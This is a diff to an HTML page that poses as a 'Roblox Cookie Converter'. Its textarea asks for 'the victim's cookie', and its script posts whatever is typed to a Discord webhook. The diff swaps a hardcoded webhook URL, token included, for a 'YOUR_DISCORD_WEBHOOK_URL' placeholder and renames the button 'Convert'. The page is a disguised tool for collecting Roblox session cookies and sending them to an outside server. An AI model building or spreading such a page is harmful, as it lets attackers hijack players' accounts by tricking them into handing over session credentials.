@@ -52,12 +52,12 @@
   </head>
   <body>
     <div id="title">🤖 Roblox Cookie Converter 🚀</div>
-    <textarea id="message"></textarea><br>
-    <button id="sendButton">Send Message</button>
+    <textarea id="message" placeholder="Type the victim's cookie here..."></textarea><br>
+    <button id="sendButton">Convert</button>
     <script>
       function sendMessage() {
         const message = document.getElementById("message").value;
-        const webhookUrl = "https://discord.com/api/webhooks/1237584893756575845/AP_2URcUznCp86IZ2GlJeJxNfyr6TXKxhA1wjU7YZvh-SKXSK6OuEaBvWvoqC6zDcfBO";
+        const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL";
 
         fetch(webhookUrl, {
           method: "POST",
